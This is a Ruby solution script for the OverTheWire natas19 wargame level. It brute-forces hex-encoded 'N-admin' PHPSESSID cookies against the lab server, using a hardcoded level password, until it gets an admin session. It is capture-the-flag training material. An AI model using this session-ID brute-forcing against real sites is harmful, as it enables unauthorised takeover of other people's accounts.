require 'uri'
require 'net/http'

def get session_id
    uri = URI.parse 'http://natas19.natas.labs.overthewire.org'
    req = Net::HTTP::Post.new uri
    req.basic_auth "natas19", "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
    req['Cookie'] = "PHPSESSID=" + session_id
    res = Net::HTTP.start uri.hostname, uri.port do |http|
        http.request req
    end
    res.body
end

for id in 1..641
    cookie = id.to_s + "-admin"
    hexc = cookie.split('').map { |i| i.ord.to_s 16 }.join
    puts cookie + " : " + hexc
    body = get hexc
    isAdmin = body.include? "You are an admin"
    if isAdmin
        puts body
        break
    end
end